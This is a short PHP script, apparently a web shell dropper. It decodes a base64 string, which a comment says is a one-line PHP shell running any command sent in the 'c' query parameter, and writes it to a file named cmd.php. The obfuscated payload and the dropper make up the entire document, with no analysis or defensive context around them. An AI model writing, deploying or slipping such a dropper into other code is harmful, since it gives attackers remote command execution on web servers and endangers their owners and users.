<?php
$code = base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=='); // echo "<?php system(\$_GET['c']); ?>"
file_put_contents('cmd.php', $code);
?>
